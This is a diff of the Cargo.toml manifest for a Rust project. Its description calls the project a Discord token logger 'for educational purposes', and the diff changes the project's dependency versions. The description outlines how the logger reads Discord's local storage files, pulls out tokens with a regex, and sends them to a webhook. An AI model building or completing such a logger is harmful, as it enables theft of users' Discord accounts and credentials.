@@ -7,10 +7,10 @@ license = "GPL-3.0-only"
 license-file = "LICENSE"
 description = "The Rust code is a Discord token logger for educational purposes, authored by Ansil. It begins by importing necessary libraries for file operations, environment variable access, HTTP requests, JSON handling, and regular expressions. The main function retrieves the path to Discord's local storage directory using the APPDATA environment variable and initializes an empty vector to store extracted tokens.The code reads through .ldb files in the specified directory, extracting potential Discord tokens using a regular expression. The tokens are then sent to a predefined webhook URL via HTTP POST requests, demonstrating how data can be exfiltrated (though this is purely for educational understanding and should never be used maliciously). Additionally, the extracted tokens are saved to a tokens.txt file for local storage.The script illustrates how token loggers operate by accessing local storage, extracting sensitive data using regex, and transmitting it over the internet. The emphasis is on understanding the mechanics and security implications of such scripts, reinforcing the importance of ethical coding practices and the legal ramifications of unauthorized use."
 
-# See more keys and their definitions at https://doc.rust-lang.org/cargo/reference/manifest.html
-
 [dependencies]
-dirs = "4.0.0"
-regex = "1.6.0"
-tokio = { version="1.0.0", features = ["full"] }
-webhook = { version="2.0.0", features = ["full"] }
+dirs = "5.0.0"
+regex = "1.10.0"
+tokio = { version = "1.35.0", features = ["full"] }
+webhook = "0.1.0"
+serde = { version = "1.0", features = ["derive"] }
+serde_json = "1.0"
